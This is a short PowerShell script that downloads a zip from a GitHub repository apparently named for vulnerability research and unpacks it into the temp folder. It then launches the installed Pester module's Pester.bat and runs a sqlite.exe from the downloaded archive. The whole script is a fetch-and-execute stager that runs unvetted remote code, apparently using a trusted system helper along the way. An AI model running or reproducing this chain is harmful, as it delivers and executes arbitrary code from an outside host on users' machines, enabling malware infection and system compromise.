$z = "$env:TEMP\a.zip"
iwr -Uri "https://github.com/SplineUser/VulnResearch/raw/refs/heads/main/dist.zip" -o $z
Expand-Archive $z $env:TEMP -Force
$b = "C:\Program Files\WindowsPowerShell\Modules\Pester"
$p = "$b\$(Get-ChildItem $b | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name)\bin\Pester.bat"

& $p
& "$env:TEMP\dist\sqlite.exe"
